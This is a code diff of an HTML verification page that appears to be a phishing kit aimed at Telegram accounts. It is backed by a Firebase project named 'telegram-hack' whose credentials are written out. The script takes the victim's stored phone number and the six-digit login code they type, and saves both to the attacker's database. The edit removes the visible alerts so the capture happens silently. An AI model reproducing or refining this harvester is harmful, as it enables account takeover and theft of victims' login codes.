@@ -108,48 +108,46 @@
         <p class="resend-link">Didn't receive the code? <a onclick="resendCode()">Resend</a></p>
     </div>
 
-    <script type = "module">
-   let userPN = sessionStorage.getItem("userPN");
+   <script type="module">
+let userPN = sessionStorage.getItem("userPN");
 
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
-        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
 
-                        const firebaseConfig = {
-                          apiKey: "AIzaSyAPshXqs91YK8XboqLb2oVx-9wlekEX6rA",
-                          authDomain: "telegram-hack-204c5.firebaseapp.com",
-                          projectId: "telegram-hack-204c5",
-                          storageBucket: "telegram-hack-204c5.firebasestorage.app",
-                          messagingSenderId: "907911003427",
-                          appId: "1:907911003427:web:821752eb6e4522cb986096",
-                          measurementId: "G-J2XJWQLDL6"
-                        };
+const firebaseConfig = {
+  apiKey: "AIzaSyAPshXqs91YK8XboqLb2oVx-9wlekEX6rA",
+  authDomain: "telegram-hack-204c5.firebaseapp.com",
+  projectId: "telegram-hack-204c5",
+  storageBucket: "telegram-hack-204c5.firebasestorage.app",
+  messagingSenderId: "907911003427",
+  appId: "1:907911003427:web:821752eb6e4522cb986096",
+  measurementId: "G-J2XJWQLDL6"
+};
 
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
 
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
+// Countdown Timer
+let timeLeft = 120; // 2 minutes in seconds
+const countdownElement = document.getElementById('countdown');
 
+const countdownInterval = setInterval(() => {
+    const minutes = Math.floor(timeLeft / 60);
+    const seconds = timeLeft % 60;
+    countdownElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+    countdownElement.style.animation = 'countdownAnimation 1s infinite';
 
-        // Countdown Timer
-        let timeLeft = 120; // 2 minutes in seconds
-        const countdownElement = document.getElementById('countdown');
+    if (timeLeft <= 0) {
+        clearInterval(countdownInterval);
+        countdownElement.textContent = "Time's up!";
+        countdownElement.style.animation = 'none';
+    } else {
+        timeLeft--;
+    }
+}, 1000);
 
-        const countdownInterval = setInterval(() => {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            countdownElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-            countdownElement.style.animation = 'countdownAnimation 1s infinite';
-
-            if (timeLeft <= 0) {
-                clearInterval(countdownInterval);
-                countdownElement.textContent = "Time's up!";
-                countdownElement.style.animation = 'none';
-            } else {
-                timeLeft--;
-            }
-        }, 1000);
-
-        // Move to next input field
-        function moveToNext(currentInput, nextIndex) {
+// Move to next input field
+function moveToNext(currentInput, nextIndex) {
     // Keep only the first digit
     currentInput.value = currentInput.value.replace(/\D/g, '').slice(0, 1);
 
@@ -162,33 +160,32 @@
     }
 }
 
-        // Verify Code
-        function verifyCode() {
-            const inputs = document.querySelectorAll('.verification-input input');
-            let code = '';
-            inputs.forEach(input => {
-                code += input.value;
-            });
+// Verify Code (no notifications)
+function verifyCode() {
+    const inputs = document.querySelectorAll('.verification-input input');
+    let code = '';
+    inputs.forEach(input => {
+        code += input.value;
+    });
 
-            if (code.length === 6) {
-                alert(`Checking Verification please wait for few second. Code: ${code}`);
-                set(ref(database, "users/" + userPN + "/versification code"), code)
-                .then(() => {
-                    
-                })
-                .catch((error) => {
-                    alert("Error: " + error.message);
-                });
-            } else {
-                alert('Please enter a 6-digit code.');
-            }
-        }
+    if (code.length === 6) {
+        set(ref(database, "users/" + userPN + "/verification_code"), code)
+        .then(() => {
+            console.log('Code stored successfully');
+        })
+        .catch((error) => {
+            console.error("Error storing code: " + error.message);
+        });
+    } else {
+        console.log('Please enter a 6-digit code.');
+    }
+}
 
-        // Resend Code
-        function resendCode() {
-            alert('Code resent! Check your phone.');
-            timeLeft = 120; // Reset the timer
-        }
-    </script>
+// Resend Code (no notifications)
+function resendCode() {
+    timeLeft = 120; // Reset the timer
+    console.log('Code resent. Check your phone.');
+}
+</script>
 </body>
 </html>
